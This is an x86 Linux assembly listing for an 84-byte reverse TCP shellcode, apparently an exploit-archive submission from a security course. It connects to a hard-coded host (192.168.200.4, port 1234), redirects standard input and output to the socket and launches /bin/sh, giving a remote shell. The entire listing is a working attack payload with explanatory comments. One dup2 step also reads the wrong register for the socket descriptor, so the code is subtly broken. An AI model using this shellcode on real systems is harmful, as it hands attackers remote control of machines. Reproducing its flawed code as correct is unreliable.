# Title: Linux/x86 - Reverse TCP Shellcode ( 84 bytes )
# Author: Xenofon Vassilakopoulos 
# Date: 2020-08-23
# Tested on: Linux 3.13.0-32-generic #57~precise1-Ubuntu i686 i386 GNU/Linux
# Architecture: i686 GNU/Linux
# Shellcode Length: 84 bytes
# SLAE-ID: SLAE - 1314 

global _start 
section .text 

_start:  

xor eax, eax   ;zero out eax register  
mul edx        ;zero out edx register 

;;sockfd = socket(AF_INET,SOCK_STREAM,0); 
push edx     ; push 0 on the stack which is related with the third argument of the socket system call
mov ebx, edx ; zero out ebx  
inc ebx      ; define the SYS_SOCKET value to be 0x1.  
push ebx     ; SOCK_STREAM constant at type argument  
push 0x2     ; AF_INET constant at domain argument 
mov ecx, esp ; ECX will point to args at the top of the stack 
mov al, 0x66 ; call SocketCall() 
int 0x80     ; call system call interrupt to execute the arguments 
mov edi, eax ; EAX will store the return value of the socket descriptor to edi register 

;; sa.sin_family = AF_INET; 
;; sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR); 
;; sa.sin_port = htons(REMOTE_PORT);
;; connect(sockfd, (struct sockaddr *)&sa, sizeof(sa));

pop ebx          ; assign ebx with value (2) 
push 0x04c8a8c0  ; push IP 192.168.200.4 on the stack
push word 0xd204 ; push port 1234 on the stack   
push bx          ; push AF_INET constant into the 16 bytes register avoiding nulls 
mov ecx, esp     ; perform stack alignment - ecx points to struct 
push 0x10        ; the size of the port  
push ecx         ; pointer to host_addr struct
push edi         ; save socket descriptor sockfd to struct 
mov ecx, esp     ; perform stack alignment - ecx points at struct
inc ebx          ; use the connect system call (3) 
mov al, 0x66     ; call the socketcall system call 
int 0x80         ; call interrupt

;;dup2(sockfd, 2); 
;;dup2(sockfd, 1); 
;;dup2(sockfd, 0); 
   
mov ebx, esi  ; move sockfd descriptor to ebx 
xor ecx, ecx  ; zero out the ecx register before using it  
lo:
  mov al, 0x3f  ; the functional number that indicates dup2 (63 in dec)
  int 0x80      ; call dup2 syscall
  inc ecx       ; increase the value of ecx by 1 so it will take all values 0(stdin), 1(stdout), 2(stderr)
  cmp cl, 0x2   ; compare ecx with 2 which indicates the stderr descriptor
  jle lo        ; loop until counter is less or equal to 2


;; execve("/bin/sh", 0, 0);
xor eax, eax     ; zero out the eax register 
push eax         ; push NULL into the stack  
push 0x68732f2f  ; push "hs//" in reverse order into stack 
push 0x6e69622f  ; push "nib/" in reverse order into stack 
mov ebx, esp     ; point ebx into stack
push eax         ; push NULL into the stack 
mov edx, esp     ; point to edx into stack  
push ebx         ; push ebx into stack 
mov ecx, esp     ; point to ecx into stack 
mov al, 0xb      ; 0xb indicates the execve syscall 
int 0x80         ; execute execve syscall

